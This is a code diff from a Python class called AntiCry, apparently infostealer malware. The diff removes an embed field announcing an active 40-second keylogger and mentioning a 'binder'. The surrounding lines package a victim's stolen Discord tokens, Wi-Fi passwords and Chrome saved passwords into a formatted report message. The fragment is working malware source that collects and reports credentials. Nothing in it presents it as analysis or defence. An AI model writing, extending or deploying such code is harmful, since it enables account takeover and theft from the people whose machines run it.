@@ -323,10 +323,6 @@ class AntiCry:
                                 "value": f"```{pf.python_version()}```"
                             },
                             {
-                                "name": "<:z_logo_trustpilot:1040751302294122507> **KeyLogger is Active at an Interval of 40 seconds**",
-                                "value": f"```if you dont see anykey logs within the server after 40\nseconds then you need Mercrial Binder <33````"
-                            },
-                            {
                                 "name": "<:z_logo_trustpilot:1040751302294122507> **System Files**",
                                 "value": f"<:wh_star:1102019798390542426>**{discord_tokens[0]}**\n<:wh_star:1102019798390542426>**{wifi_passwords}**\n<:wh_star:1102019798390542426>**{chrome_passwords}**\n<:wh_star:1102019798390542426>**{self.ErrorLog()}**"
                             },
